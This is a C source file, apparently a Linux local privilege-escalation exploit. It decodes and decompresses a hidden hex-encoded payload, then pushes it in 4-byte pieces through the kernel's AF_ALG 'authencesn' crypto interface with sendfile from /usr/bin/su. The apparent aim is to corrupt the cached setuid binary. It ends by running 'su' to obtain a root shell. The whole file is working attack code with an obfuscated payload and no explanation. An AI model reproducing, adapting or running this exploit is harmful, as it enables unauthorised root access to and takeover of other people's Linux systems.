#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <zlib.h>

#define E_ZLIB_HEX "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

static void die(const char *what)
{
    perror(what);
    exit(EXIT_FAILURE);
}

static int hex_value(char c)
{
    if (c >= '0' && c <= '9')
    {
        return c - '0';
    }
    if (c >= 'a' && c <= 'f')
    {
        return c - 'a' + 10;
    }
    if (c >= 'A' && c <= 'F')
    {
        return c - 'A' + 10;
    }
    return -1;
}

static unsigned char *hex_decode(const char *hex, size_t *out_len)
{
    size_t hex_len = strlen(hex);
    unsigned char *out;

    if ((hex_len % 2) != 0)
    {
        fprintf(stderr, "hex string has odd length\n");
        exit(EXIT_FAILURE);
    }

    *out_len = hex_len / 2;
    out = malloc(*out_len == 0 ? 1 : *out_len);
    if (out == NULL)
    {
        die("malloc");
    }

    for (size_t i = 0; i < *out_len; i++)
    {
        int hi = hex_value(hex[i * 2]);
        int lo = hex_value(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0)
        {
            fprintf(stderr, "hex string contains non-hex character\n");
            exit(EXIT_FAILURE);
        }
        out[i] = (unsigned char)((hi << 4) | lo);
    }

    return out;
}

static unsigned char *zlib_decompress(const unsigned char *in, size_t in_len, size_t *out_len)
{
    int ret;
    z_stream zs;
    size_t cap = 4096;
    unsigned char *out;

    if (in_len == 0)
    {
        *out_len = 0;
        out = malloc(1);
        if (out == NULL)
        {
            die("malloc");
        }
        return out;
    }

    out = malloc(cap);
    if (out == NULL)
    {
        die("malloc");
    }

    memset(&zs, 0, sizeof(zs));
    zs.next_in = (Bytef *)in;
    zs.avail_in = (uInt)in_len;

    ret = inflateInit(&zs);
    if (ret != Z_OK)
    {
        fprintf(stderr, "inflateInit failed: %d\n", ret);
        exit(EXIT_FAILURE);
    }

    for (;;)
    {
        if (zs.total_out == cap)
        {
            unsigned char *new_out;

            cap *= 2;
            new_out = realloc(out, cap);
            if (new_out == NULL)
            {
                inflateEnd(&zs);
                die("realloc");
            }
            out = new_out;
        }

        zs.next_out = out + zs.total_out;
        zs.avail_out = (uInt)(cap - zs.total_out);
        ret = inflate(&zs, Z_NO_FLUSH);
        if (ret == Z_STREAM_END)
        {
            break;
        }
        if (ret != Z_OK)
        {
            inflateEnd(&zs);
            fprintf(stderr, "inflate failed: %d\n", ret);
            exit(EXIT_FAILURE);
        }
    }

    *out_len = zs.total_out;
    inflateEnd(&zs);
    return out;
}

static int set_cmsg(char **ptr, int level, int type, const void *data, size_t len)
{
    struct cmsghdr *cmsg = (struct cmsghdr *)*ptr;

    cmsg->cmsg_level = level;
    cmsg->cmsg_type = type;
    cmsg->cmsg_len = CMSG_LEN(len);
    if (len != 0)
    {
        memcpy(CMSG_DATA(cmsg), data, len);
    }

    *ptr += CMSG_SPACE(len);
    return 0;
}

static void c(int f, size_t t, const unsigned char *chunk, size_t chunk_len)
{
    int a = -1;
    int u = -1;
    struct sockaddr_alg sa;
    unsigned char key[40] = {
        0x08,
        0x00,
        0x01,
        0x00,
        0x00,
        0x00,
        0x00,
        0x10,
    };
    uint32_t op = 0;
    unsigned char iv[20] = {0x10};
    uint32_t assoclen = 8;
    unsigned char prefix[4] = {'A', 'A', 'A', 'A'};
    struct iovec iov[2];
    char control[CMSG_SPACE(sizeof(op)) +
                 CMSG_SPACE(sizeof(iv)) +
                 CMSG_SPACE(sizeof(assoclen))];
    char *cptr = control;
    struct msghdr msg;
    size_t o = t + 4;
    off_t off = 0;
    char recvbuf[4096];

    a = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (a < 0)
    {
        die("socket");
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");
    if (bind(a, (struct sockaddr *)&sa, sizeof(sa)) < 0)
    {
        die("bind");
    }

    if (setsockopt(a, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0)
    {
        die("setsockopt ALG_SET_KEY");
    }

    if (setsockopt(a, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0)
    {
        die("setsockopt ALG_SET_AEAD_AUTHSIZE");
    }

    u = accept(a, NULL, NULL);
    if (u < 0)
    {
        die("accept");
    }

    memset(control, 0, sizeof(control));
    set_cmsg(&cptr, SOL_ALG, ALG_SET_OP, &op, sizeof(op));
    set_cmsg(&cptr, SOL_ALG, ALG_SET_IV, iv, sizeof(iv));
    set_cmsg(&cptr, SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &assoclen, sizeof(assoclen));

    iov[0].iov_base = prefix;
    iov[0].iov_len = sizeof(prefix);
    iov[1].iov_base = (void *)chunk;
    iov[1].iov_len = chunk_len;

    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = 2;
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);

    if (sendmsg(u, &msg, MSG_MORE) < 0)
    {
        die("sendmsg");
    }

    if (sendfile(u, f, &off, o) < 0)
    {
        die("sendfile");
    }

    (void)recv(u, recvbuf, sizeof(recvbuf), 0);

    close(u);
    close(a);
}

int main(void)
{
    int f;
    size_t i = 0;
    size_t packed_len = 0;
    size_t e_len = 0;
    unsigned char *packed = hex_decode(E_ZLIB_HEX, &packed_len);
    unsigned char *e = zlib_decompress(packed, packed_len, &e_len);

    f = open("/usr/bin/su", O_RDONLY);
    if (f < 0)
    {
        die("open /usr/bin/su");
    }

    while (i < e_len)
    {
        size_t chunk_len = e_len - i;
        if (chunk_len > 4)
        {
            chunk_len = 4;
        }

        c(f, i, e + i, chunk_len);
        i += 4;
    }

    close(f);
    free(e);
    free(packed);
    return system("su");
}
